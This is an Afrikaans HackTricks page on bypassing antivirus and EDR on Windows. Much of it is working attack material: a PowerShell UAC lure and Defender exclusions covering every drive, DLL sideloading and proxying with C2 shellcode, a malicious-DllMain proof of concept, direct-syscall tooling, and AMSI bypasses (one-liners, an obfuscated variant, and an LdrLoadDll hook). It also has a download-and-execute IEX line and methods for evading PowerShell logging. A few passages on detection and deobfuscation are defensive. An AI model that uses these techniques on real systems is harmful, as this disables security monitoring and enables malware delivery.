# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Hierdie bladsy is geskryf deur** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): ’n hulpmiddel om Windows Defender se werking te stop.
- [no-defender](https://github.com/es3n1n/no-defender): ’n hulpmiddel om Windows Defender se werking te stop deur ’n ander AV voor te gee.
- [Skakel Defender uit as jy admin is](basic-powershell-for-pentesters/README.md)

### Installeerder-agtige UAC lokaas voordat jy met Defender knoei

Openbare loaders wat as game cheats voorgee, word dikwels afgelewer as ongetekende Node.js/Nexe installers wat eers die gebruiker om elevation vra en eers daarna Defender neutraliseer. Die proses is eenvoudig:

1. Ondersoek vir administratiewe konteks met `net session`. Die opdrag slaag slegs wanneer die aanroeper admin-regte het, so ’n mislukking dui daarop dat die loader as ’n standaard gebruiker hardloop.
2. Herlanseer onmiddellik homself met die `RunAs` verb om die verwagte UAC consent prompt te veroorsaak terwyl die oorspronklike command line bewaar word.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Slagoffers glo reeds dat hulle “cracked” sagteware installeer, so die prompt word gewoonlik aanvaar, wat die malware die regte gee wat dit nodig het om Defender se beleid te verander.

### Algemene `MpPreference` uitsluitings vir elke skyfletter

Sodra verhoogde regte verkry is, maksimeer GachiLoader-style chains Defender se blinde kolle, in plaas daarvan om die diens heeltemal uit te skakel. Die loader beëindig eers die GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) en druk dan **uiters breë uitsluitings** sodat elke gebruikersprofiel, stelselgids en verwyderbare skyf nie geskandeer kan word:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- The loop walks every mounted filesystem (D:\, E:\, USB sticks, etc.) so **enige toekomstige payload wat oral op die skyf neergesit word, word geïgnoreer**.
- The `.sys` extension exclusion is forward-looking—attackers reserve the option to load unsigned drivers later without touching Defender again.
- All changes land under `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, letting later stages confirm the exclusions persist or expand them without re-triggering UAC.

Because no Defender service is stopped, naïve health checks keep reporting “antivirus active” even though real-time inspection never touches those paths.

## **AV Ontduikingsmetodologie**

Tans gebruik AVs verskillende metodes om te bepaal of ’n lêer kwaadwillig is of nie: statiese opsporing, dinamiese analise, en vir die meer gevorderde EDRs, gedragsanalise.

### **Statiese opsporing**

Statiese opsporing word bereik deur bekende kwaadwillige strings of byt-reekse in ’n binary of script te merk, en ook deur inligting uit die lêer self te onttrek (bv. file description, company name, digital signatures, icon, checksum, ens.). Dit beteken dat die gebruik van bekende publieke tools jou makliker kan vang, aangesien hulle waarskynlik al geanaliseer en as kwaadwillig gemerk is. Daar is ’n paar maniere om hierdie tipe opsporing te omseil:

- **Encryption**

As jy die binary enkripteer, sal AV geen manier hê om jou program te detecteer nie, maar jy sal ’n soort loader nodig hê om dit te dekripteer en die program in geheue te laat loop.

- **Obfuscation**

Soms hoef jy net ’n paar strings in jou binary of script te verander om dit deur AV te kry, maar dit kan tydrowend wees, afhangend van wat jy probeer obfuskeer.

- **Custom tooling**

As jy jou eie tools ontwikkel, sal daar geen bekende slegte signatures wees nie, maar dit verg baie tyd en moeite.

> [!TIP]
> A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.

Ek beveel sterk aan dat jy hierdie YouTube playlist oor praktiese AV Evasion aanskou: https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf

### **Dinamiese analise**

Dinamiese analise is wanneer die AV jou binary in ’n sandbox laat loop en kyk vir kwaadwillige aktiwiteit (bv. probeer om jou blaaier se wagwoorde te dekripteer en te lees, ’n minidump op LSASS uit te voer, ens.). Hierdie deel kan ’n bietjie moelik wees om mee te werk, maar hier is ’n paar dinge wat jy kan doen om sandboxes te omseil.

- **Wag voor uitvoering** Afhangend van hoe dit geïmplementeer is, kan dit ’n uitstekende manier wees om AV se dinamiese analise te omseil. AV’s het baie min tyd om lêers te scan om die gebruiker se werkvloei nie te onderbreek nie, so die gebruik van lang sleeps kan die analise van binaries ontwrig. Die probleem is dat baie AV-sandboxes die sleep eenvoudig kan oorslaan, afhangend van die implementering.
- **Kontroleer die masjien se bronne** Gewoonlik het sandboxes baie min hulpbronne tot hul beskikking (bv. < 2GB RAM), anders sou hulle die gebruiker se masjien vertraag. Jy kan hier baie kreatief wees, byvoorbeeld deur die CPU se temperatuur of selfs die waaier-snelhede te kontroleer — nie alles word in die sandbox geïmplementeer nie.
- **Masjien-spesifieke kontroles** As jy ’n spesifieke gebruiker wil teiken wie se werkstasie by die "contoso.local" domein aangesluit is, kan jy die rekenaar se domein nagaan om te sien of dit ooreenstem met die een wat jy gespesifiseer het; as dit nie ooreenstem nie, kan jou program eenvoudig afsluit.

Dit blyk dat Microsoft Defender se Sandbox rekenaarnáám HAL9TH is, so jy kan vir daardie rekenaarnáám in jou malware kyk voor detonering — as die naam HAL9TH is, beteken dit jy is binne Defender se sandbox, en jy kan jou program laat afsluit.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>bron: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sommige ander goeie wenke van [@mgeeky](https://twitter.com/mariuszbit) vir die hantering van Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanaal</p></figcaption></figure>

Soos ons vroeër in hierdie stuk gesê het, **public tools** sal uiteindelik **gedetecteer word**, dus moet jy jouself ’n vraag vra:

Byvoorbeeld, as jy LSASS wil dump, **moet jy regtig mimikatz gebruik**? Of kan jy ’n ander projek gebruik wat minder bekend is en ook LSASS dump?

Die regte antwoord is waarskynlik die laasgenoemde. Neem mimikatz as voorbeeld: dit is waarskynlik een van die, indien nie die mees, gemerkte stukke malware deur AVs en EDRs; al is die projek self baie cool, dit is ook ’n nagmerrie om daarmee te werk om AV’s te omseil, so soek eerder alternatiewe vir wat jy probeer bereik.

> [!TIP]
> Wanneer jy jou payloads vir ontduiking wysig, maak seker dat jy **outomatiese sample submission afskakel** in Defender, en asseblief, ernstig, **DO NOT UPLOAD TO VIRUSTOTAL** as jou doel op die lang duur ontduiking is. As jy wil nagaan of jou payload deur ’n bepaalde AV gedetecteer word, installeer dit op ’n VM, probeer om die outomatiese sample submission af te skakel, en toets dit daar totdat jy tevrede is met die resultaat.

## EXEs vs DLLs

Wanneer dit moontlik is, prioritiseer altyd die gebruik van DLLs vir ontduiking; uit my ervaring word DLL-lêers gewoonlik baie minder gedetecteer en ontleed, so dit is ’n eenvoudige truuk om in sekere gevalle deteksie te vermy (as jou payload natuurlik op een of ander manier as ’n DLL kan loop).

Soos ons in hierdie beeld kan sien, het ’n DLL Payload van Havoc ’n detectiekoers van 4/26 in antiscan.me, terwyl die EXE payload ’n detectiekoers van 7/26 het.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me vergelyking van ’n normale Havoc EXE payload vs ’n normale Havoc DLL</p></figcaption></figure>

Nou wys ons ’n paar truuks wat jy met DLL-lêers kan gebruik om baie meer stil te wees.

## DLL Sideloading & Proxying

**DLL Sideloading** maak voordeel van die DLL search order wat deur die loader gebruik word deur beide die slagoffer-toepassing en kwaadwillige payload(s) langs mekaar te plaas.

Jy kan programme wat vatbaar is vir DLL Sideloading nagaan met [Siofra](https://github.com/Cybereason/siofra) en die volgende powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Hierdie kommando sal die lys van programme wat vatbaar is vir DLL hijacking binne "C:\Program Files\\" en die DLL-lêers wat hulle probeer laai, uitvoer.

Ek beveel sterk aan dat jy **explore DLL Hijackable/Sideloadable programs yourself**; hierdie tegniek is baie stealthy as dit behoorlik gedoen word, maar as jy openlik bekende DLL Sideloadable programs gebruik, kan jy maklik betrap word.

Net deur 'n slegwillige DLL met die naam wat 'n program verwag om te laai te plaas, sal nie noodwendig jou payload laai nie, aangesien die program sekere spesifieke funksies binne daardie DLL verwag; om hierdie probleem reg te stel, sal ons 'n ander tegniek gebruik wat **DLL Proxying/Forwarding** genoem word.

**DLL Proxying** stuur die oproepe wat 'n program maak vanaf die proxy (en slegwillige) DLL na die oorspronklike DLL, en behou dus die program se funksionaliteit terwyl dit die uitvoering van jou payload kan hanteer.

Ek gaan die [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projek van [@flangvik](https://twitter.com/Flangvik/) gebruik.

Hier is die stappe wat ek gevolg het:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Die laaste opdrag sal ons 2 lêers gee: 'n DLL-bronkode-sjabloon en die oorspronklike hernoemde DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Dit is die resultate:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Beide ons shellcode (gekodeer met [SGN](https://github.com/EgeBalci/sgn)) en die proxy DLL het 'n 0/26 deteksiekoers by [antiscan.me](https://antiscan.me)! Ek sou dit 'n sukses noem.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ek beveel **uiters aan** dat jy kyk na [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) oor DLL Sideloading en ook [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) om meer te leer oor wat ons meer in-diepte bespreek het.

### Misbruik van Forwarded Exports (ForwardSideLoading)

Windows PE-modules kan funksies exporteer wat eintlik "forwarders" is: in plaas daarvan dat dit na kode verwys, bevat die export-invoer 'n ASCII-tekenreeks van die vorm `TargetDll.TargetFunc`. Wanneer 'n caller die export oplos, sal die Windows-loader:

- Laai `TargetDll` as dit nog nie gelaai is nie
- Los `TargetFunc` daarvan op

Belangrike gedrag om te verstaan:
- As `TargetDll` 'n KnownDLL is, word dit verskaf vanaf die beskermde KnownDLLs-naamruimte (bv. ntdll, kernelbase, ole32).
- As `TargetDll` nie 'n KnownDLL is nie, word die normale DLL-soekorde gebruik, wat die gids van die module wat die forward-resolusie doen insluit.

Dit skep 'n indirekte sideloading-primitive: vind 'n signed DLL wat 'n funksie eksporteer wat forwarded is na 'n nie-KnownDLL modulenaam, plaas daardie signed DLL dan in dieselfde gids as 'n attacker-controlled DLL wat presies dieselfde naam het as die forwarded teikenmodule. Wanneer die forwarded export aangeroep word, los die loader die forward op en laai jou DLL vanaf dieselfde gids, en voer jou DllMain uit.

Voorbeeld waargeneem op Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` is nie 'n KnownDLL nie, so dit word via die normale soekorde opgelos.

PoC (copy-paste):
1) Kopieer die ondertekende stelsel-DLL na 'n skryfbare gids
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Plaas 'n kwaadwillige `NCRYPTPROV.dll` in dieselfde gids. 'n minimale DllMain is genoeg om kode-uitvoering te kry; jy hoef nie die doorgestuurde funksie te implementeer om DllMain te aktiveer nie.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Aktiveer die forward met 'n ondertekende LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (onderteken) laai die side-by-side `keyiso.dll` (onderteken)
- Terwyl dit `KeyIsoSetAuditingInterface` oplos, volg die loader die forward na `NCRYPTPROV.SetAuditingInterface`
- Die loader laai dan `NCRYPTPROV.dll` van `C:\test` en voer sy `DllMain` uit
- As `SetAuditingInterface` nie geïmplementeer is nie, kry jy eers 'n "missing API" fout nadat `DllMain` reeds geloop het

Hunting tips:
- Fokus op forwarded exports waar die teikenmodule nie 'n KnownDLL is nie. KnownDLLs is gelys onder `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Jy kan forwarded exports opnoem met gereedskap soos:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Sien die Windows 11 forwarder-inventaris om na kandidate te soek: https://hexacorn.com/d/apis_fwd.txt

Opsporing-/verdedigingsidees:
- Monitor LOLBins (e.g., rundll32.exe) wat gesigneerde DLLs vanaf nie-stelselpaaie laai, gevolg deur die laai van nie-KnownDLLs met dieselfde basenaam uit daardie gids
- Waarsku op proses-/module-kettings soos: `rundll32.exe` → nie-stelsel `keyiso.dll` → `NCRYPTPROV.dll` onder gebruikers-skryfbare paaie
- Handhaaf code-integriteitsbeleid (WDAC/AppLocker) en weier write+execute in toepassingsgidse

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Jy kan Freeze gebruik om jou shellcode op 'n onopvallende wyse te laai en uit te voer.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasie is net 'n kat-en-muis-speletjie; wat vandag werk, kan môre opgespoor word, so moenie op net een tool staatmaak nie — indien moontlik, probeer om verskeie evasion techniques aan mekaar te koppel.

## Direk/Indirek Syscalls & SSN-opsporing (SysWhispers4)

EDRs plaas dikwels **user-mode inline hooks** op `ntdll.dll` syscall stubs. Om daardie hooks te omseil, kan jy **direct** of **indirect** syscall stubs genereer wat die korrekte **SSN** (Sisteemdiensnommer) laai en na kernel-modus oorgaan sonder om die gehookte export entrypoint uit te voer.

**Invocation options:**
- **Direct (embedded)**: skryf 'n `syscall`/`sysenter`/`SVC #0` instruksie in die gegenereerde stub (geen `ntdll` export hit nie).
- **Indirect**: spring in 'n bestaande `syscall` gadget binne `ntdll` sodat die kernel-oorgang lyk of dit vanaf `ntdll` afkomstig is (nuttig vir heuristic evasion); **randomized indirect** kies 'n gadget uit 'n pool per oproep.
- **Egg-hunt**: vermy om die statiese `0F 05` opcode-sekwensie op skyf in te sluit; los 'n syscall-sekwensie op tydens runtime.

**SSN-opsporingsstrategieë wat weerstand bied teen hooks:**
- **FreshyCalls (VA sort)**: leid SSNs af deur syscall stubs volgens virtuele adres te sorteer in plaas daarvan om stub-bytes te lees.
- **SyscallsFromDisk**: map 'n skoon `\KnownDlls\ntdll.dll`, lees SSNs uit sy `.text`, en unmap dan (omseil alle in-memory hooks).
- **RecycledGate**: kombineer VA-gesorteerde SSN-afleiding met opcode-validatie wanneer 'n stub skoon is; val terug op VA-afleiding as dit gehook is.
- **HW Breakpoint**: stel DR0 op die `syscall` instruksie en gebruik 'n VEH om die SSN vanaf `EAX` tydens runtime te vang, sonder om gehookte bytes te ontleed.

Voorbeeldgebruik van SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI is geskep om "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" te voorkom. Aanvanklik kon AV's slegs **files on disk** skandeer, so as jy op een of ander manier payloads **directly in-memory** kon uitvoer, kon die AV niks daaraan doen nie, aangesien dit nie genoeg sigbaarheid gehad het nie.

Die AMSI-funksie is geïntegreer in die volgende komponente van Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Dit laat antivirus-oplossings toe om scriptgedrag te inspekteer deur scriptinhoud bloot te lê in 'n vorm wat beide ongeskryf/encrypted en unobfuscated is.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` sal die volgende waarskuwing op Windows Defender produseer.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Let hoe dit `amsi:` vooraan plaas en dan die pad na die uitvoerbare program waarvan die script uitgevoer is, in hierdie geval, powershell.exe

Ons het geen lêer na skyf weggelaat nie, maar is steeds in-memory gevang as gevolg van AMSI.

Boonop, vanaf **.NET 4.8**, word C# code ook deur AMSI verwerk. Dit beïnvloed selfs `Assembly.Load(byte[])` om in-memory uitvoering te laai. Daarom word die gebruik van laer weergawes van .NET (soos 4.7.2 of laer) aanbeveel vir in-memory uitvoering as jy AMSI wil omseil.

Daar is 'n paar maniere om AMSI te omseil:

- **Obfuscation**

Aangesien AMSI hoofsaaklik met statiese detectors werk, kan die wysiging van die scripts wat jy probeer laai 'n goeie manier wees om deteksie te ontduik.

Echter, AMSI het die vermoë om scripts te unobfuscate selfs al het dit meerdere lae, so obfuscation kan 'n slegte opsie wees afhangend van hoe dit gedoen word. Dit maak dit nie noodwendig eenvoudig om te omseil nie. Soms hoef jy egter net 'n paar veranderlike name te verander en jy is gereed, so dit hang af hoeveel iets gemerk is.

- **AMSI Bypass**

Aangesien AMSI geïmplementeer word deur 'n DLL in die powershell (ook cscript.exe, wscript.exe, ens.) proses te laai, is dit moontlik om dit maklik te manipuleer selfs terwyl jy as 'n onprivilegieerde gebruiker loop. Vanweë hierdie gebrek in die implementering van AMSI het navorsers verskeie maniere gevind om AMSI-skandering te ontduik.

**Forcing an Error**

Afdwing van die AMSI-initialisering om te misluk (amsiInitFailed) sal tot gevolg hê dat geen skandering vir die huidige proses geïnisieer word nie. Aanvanklik is dit bekend gemaak deur [Matt Graeber](https://twitter.com/mattifestation) en Microsoft het 'n signature ontwikkel om wyer gebruik te voorkom.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Dit het net een reël powershell code geneem om AMSI onbruikbaar te maak vir die huidige powershell-proses. Hierdie reël is natuurlik deur AMSI self gevlag, dus is 'n aanpassing nodig om hierdie tegniek te gebruik.

Hier is 'n gemodifiseerde AMSI bypass wat ek van hierdie [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) geneem het.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Hou in gedagte dat dit waarskynlik opgemerk sal word sodra hierdie pos uitkom; as jou plan is om onopgemerk te bly, moet jy geen kode publiseer nie.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Lees asseblief [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) vir 'n meer gedetaileerde verduideliking.

Daar is ook baie ander tegnieke wat gebruik word om AMSI met powershell te omseil; kyk na [**hierdie bladsy**](basic-powershell-for-pentesters/index.html#amsi-bypass) en [**hierdie repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) om meer daaroor te leer.

### Blokkeer AMSI deur te voorkom dat amsi.dll gelaai word (LdrLoadDll hook)

AMSI word eers geïnisialiseer nadat `amsi.dll` in die huidige proses gelaai is. 'n Robuuste, taalonafhanklike bypass is om 'n user‑mode hook op `ntdll!LdrLoadDll` te plaas wat 'n fout teruggee wanneer die aangevraagde module `amsi.dll` is. As gevolg daarvan laai AMSI nooit en vind daar geen skanderings vir daardie proses plaas nie.

Implementasie-oorsig (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Aantekeninge
- Werk oor PowerShell, WScript/CScript en persoonlike loaders (enige iets wat andersins AMSI sal laai).
- Kombineer met die voerin van skripte oor stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) om lang opdragreël-artefakte te vermy.
- Waargeneem in gebruik deur loaders wat via LOLBins uitgevoer word (bv., `regsvr32` wat `DllRegisterServer` aanroep).

Die hulpmiddel **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** genereer ook skrip om AMSI te omseil.
Die hulpmiddel **[https://amsibypass.com/](https://amsibypass.com/)** genereer ook skripte om AMSI te omseil wat handtekeninge vermy deur gebruikersgedefinieerde funksies, veranderlikes en karakteruitdrukkings te randomiseer, en wat lukrake karakter‑hoofdletters/kleinskryf op PowerShell‑sleutelwoorde toepas om handtekeninge te omseil.

**Verwyder die gedetekteerde handtekening**

Jy kan 'n hulpmiddel soos **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** en **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gebruik om die gedetekteerde AMSI‑handtekening uit die geheue van die huidige proses te verwyder. Hierdie hulpmiddel werk deur die geheue van die huidige proses te skandeer vir die AMSI‑handtekening en dit dan met NOP‑instruksies te oorskryf, wat dit effektief uit die geheue verwyder.

**AV/EDR-produkte wat AMSI gebruik**

Jy kan 'n lys van AV/EDR‑produkte wat AMSI gebruik vind by **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Gebruik PowerShell weergawe 2**
As jy PowerShell weergawe 2 gebruik, sal AMSI nie gelaai word nie, sodat jy jou skripte kan uitvoer sonder dat AMSI dit sal skandeer. Jy kan dit so doen:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging is a feature that allows you to log all PowerShell commands executed on a system. Dit kan nuttig wees vir auditering en foutopsporing, maar dit kan ook 'n **probleem vir attackers wat opsporing wil ontduik** wees.

To bypass PowerShell logging, you can use the following techniques:

- **Disable PowerShell Transcription and Module Logging**: Jy kan 'n hulpmiddel soos [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) hiervoor gebruik.
- **Use Powershell version 2**: As jy PowerShell version 2 gebruik, sal AMSI nie gelaai word nie, sodat jy jou skripte kan uitvoer sonder om deur AMSI gescan te word. Jy kan dit so doen: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Gebruik [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) om 'n powershell sonder verdediging te spawn (dit is wat `powerpick` van Cobal Strike gebruik).


## Obfuscation

> [!TIP]
> Several obfuscation techniques relies on encrypting data, which will increase the entropy of the binary which will make easier for AVs and EDRs to detect it. Wees versigtig hiermee en oorweeg om enkripsie slegs op spesifieke gedeeltes van jou kode toe te pas wat sensitief is of weggeborg moet word.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Wanneer jy malware ontleed wat ConfuserEx 2 (of kommersiële forks) gebruik, is dit algemeen om verskeie beskermingslae te teëkom wat dekompileerders en sandbokse sal blokkeer. Die onderstaande workflow herstel betroubaar 'n byna–oorblywende IL wat daarna in C# gedecompileer kan word in gereedskap soos dnSpy of ILSpy.

1.  Anti-tampering removal – ConfuserEx enkripsieer elke *method body* en dekripteer dit binne die *module* static constructor (`<Module>.cctor`). Dit patch ook die PE checksum sodat enige modifikasie die binêre sal laat crash. Gebruik **AntiTamperKiller** om die enkripsieerde metadata-tabelle te lokaliseer, die XOR-sleutels te herstel en 'n skoon assembly te herskryf:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Die output bevat die 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) wat nuttig kan wees wanneer jy jou eie unpacker bou.

2.  Symbol / control-flow recovery – voer die *clean* lêer in by **de4dot-cex** (n ConfuserEx-aware fork van de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – kies die ConfuserEx 2 profiel  
• de4dot sal control-flow flattening ongedaan maak, oorspronklike namespaces, klasse en veranderlike name herstel en konstante stringe dekripteer.

3.  Proxy-call stripping – ConfuserEx vervang direkte metode-oproepe met liggewig wrappers (a.k.a *proxy calls*) om verdere dekompilasie te breek. Verwyder dit met **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Na hierdie stap behoort jy normale .NET API's soos `Convert.FromBase64String` of `AES.Create()` te sien in plaas van opaak wrapper-funksies (`Class8.smethod_10`, …).

4.  Manual clean-up – voer die resulterende binêr onder dnSpy uit, soek na groot Base64-blobs of `RijndaelManaged`/`TripleDESCryptoServiceProvider` gebruik om die *egte* payload te lokaliseer. Dikwels stoor die malware dit as 'n TLV-geënkodeerde byte array geïnitialiseer binne `<Module>.byte_0`.

Hierdie ketting herstel die uitvoeringstroom **sonder** dat dit nodig is om die kwaadwillige monster te laat loop – nuttig wanneer jy op 'n offline werkstasie werk.

> 🛈  ConfuserEx produseer 'n custom attribute met die naam `ConfusedByAttribute` wat as 'n IOC gebruik kan word om monsters outomaties te triage.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Die doel van hierdie projek is om 'n open-source fork van die [LLVM](http://www.llvm.org/) kompilasie-suite te verskaf wat verhoogde sagteware-sekuriteit deur [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) en tamper-proofing kan bied.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstreer hoe om die `C++11/14` taal te gebruik om tydens kompilering obfuscated code te genereer sonder om enige eksterne hulpmiddel te gebruik en sonder om die kompilator te wysig.
- [**obfy**](https://github.com/fritzone/obfy): Voeg 'n laag van obfuscated operations by wat gegenereer word deur die C++ template metaprogramming framework wat die lewe van die persoon wat die toepassing wil crack 'n bietjie moeiliker sal maak.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz is 'n x64 binary obfuscator wat verskeie verskillende PE-lêers kan obfuskeer, insluitend: .exe, .dll, .sys
